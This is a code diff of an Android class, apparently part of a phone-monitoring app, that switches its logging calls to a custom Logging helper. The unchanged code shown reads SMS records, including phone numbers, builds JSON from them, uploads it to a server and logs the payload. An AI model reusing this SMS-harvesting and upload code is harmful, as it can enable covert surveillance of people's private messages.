@@ -7,10 +7,10 @@ import android.content.Context;
 import android.database.Cursor;
 import android.net.Uri;
 import android.os.AsyncTask;
-import android.util.Log;
 
 import com.inet.android.convertdate.ConvertDate;
 import com.inet.android.request.DataRequest;
+import com.inet.android.utils.Logging;
 
 /**
  * Archive Sms. Watch sms
@@ -20,8 +20,8 @@ import com.inet.android.request.DataRequest;
 public class ArchiveSms extends AsyncTask<Context, Void, Void> {
 	ConvertDate date;
 	Context mContext;
-	private static final String TAG = "ArchiveSMS";
-
+	private String LOG_TAG = "Arhive SMS";
+	
 	public void getSmsLogs() {
 		try {
 			// формируем JSONobj
@@ -38,7 +38,7 @@ public class ArchiveSms extends AsyncTask<Context, Void, Void> {
 						// Type of call retrieved from the cursor.
 						int type = sms_sent_cursor.getInt(sms_sent_cursor
 								.getColumnIndex("type"));
-						 Log.e("Info","SMS Type : " + type);
+						Logging.doLog(LOG_TAG, "SMS Type : " + type);
 	                       	switch (type) {
 						case 1:
 							sType = "5";
@@ -49,7 +49,7 @@ public class ArchiveSms extends AsyncTask<Context, Void, Void> {
 						default:
 							break;
 						}
-						Log.d(TAG,
+	                       	Logging.doLog(LOG_TAG,
 								sms_sent_cursor.getString(sms_sent_cursor
 										.getColumnIndex("address"))
 										+ sms_sent_cursor.getString(sms_sent_cursor
@@ -81,28 +81,7 @@ public class ArchiveSms extends AsyncTask<Context, Void, Void> {
 
 						sms_sent_cursor.moveToNext();
 
-						// String sendStr = "<packet><id>"
-						// + sp.getString("ID", "ID")
-						// + "</id><time>"
-						// + logTime()
-						// + "</time><type>4</type><app>"
-						// + dir
-						// + "</app><ttl>"
-						// + sms_sent_cursor
-						// .getString(sms_sent_cursor
-						// .getColumnIndex("address"))
-						// + "</ttl><cdata1>"
-						// + sms_sent_cursor
-						// .getString(sms_sent_cursor
-						// .getColumnIndex("body"))
-						// + "</cdata1><ntime>" + "30"
-						// + "</ntime></packetSentObserver>";
-
-						/*
-						 * if(colNames != null){ for(int k=0; k<colNames.length;
-						 * k++){ Log.e(TAG, "colNames["+k+"] : " + colNames[k]);
-						 * } }
-						 */
+						
 					}
 
 				}
@@ -110,14 +89,14 @@ public class ArchiveSms extends AsyncTask<Context, Void, Void> {
 				if (AllSmsJson != null) {
 					DataRequest dr = new DataRequest(mContext);
 					dr.sendRequest(AllSmsJson.toString());
-					Log.d("JsonCall", AllSmsJson.toString());
+					Logging.doLog(LOG_TAG, "Json" +  AllSmsJson.toString());
 				}
 				// Log.d("JsonSms", AllCallJson.toString());
 
 			} else
-				Log.e(TAG, "Send Cursor is Empty");
+				Logging.doLog(LOG_TAG, "Send Cursor is Empty", "Send Cursor is Empty");
 		} catch (Exception sggh) {
-			Log.e(TAG, "Error on onChange : " + sggh.toString());
+			Logging.doLog(LOG_TAG, "Error on onChange : " + sggh.toString(), "Error on onChange : " + sggh.toString());
 		}
 
 	}
@@ -125,9 +104,9 @@ public class ArchiveSms extends AsyncTask<Context, Void, Void> {
 	@Override
 	protected Void doInBackground(Context... params) {
 		// TODO Автоматически созданная заглушка метода
-		Log.d("doInBack", "doIn");
+		Logging.doLog(LOG_TAG , "doIn");
 		this.mContext = params[0];
-		Log.d("doInBack", mContext.toString());
+		Logging.doLog(LOG_TAG, mContext.toString());
 		getSmsLogs();
 		return null;
 	}
